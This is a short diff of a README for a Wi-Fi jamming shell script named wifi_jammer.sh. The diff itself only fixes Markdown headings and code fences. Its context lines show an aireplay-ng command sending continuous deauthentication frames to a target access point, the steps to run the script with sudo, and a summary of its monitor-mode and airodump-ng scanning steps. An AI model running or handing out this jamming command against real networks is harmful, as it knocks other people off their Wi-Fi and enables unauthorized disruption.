@@ -53,7 +53,7 @@ echo "[*] Starting deauthentication attack on $bssid..."
 sleep 2
 aireplay-ng --deauth 0 -a $bssid $mon_iface
 ```
-⚙️ How to Run
+## ⚙️ How to Run
 Save the script as wifi_jammer.sh
 
 Make it executable:
@@ -64,11 +64,11 @@ chmod +x wifi_jammer.sh
 ```
 Run with sudo:
 
-bash
-Copy
+```bash
 Edit
 sudo ./wifi_jammer.sh
-🧠 How It Works
+```
+## 🧠 How It Works
 Enables monitor mode with airmon-ng
 
 Scans networks using airodump-ng
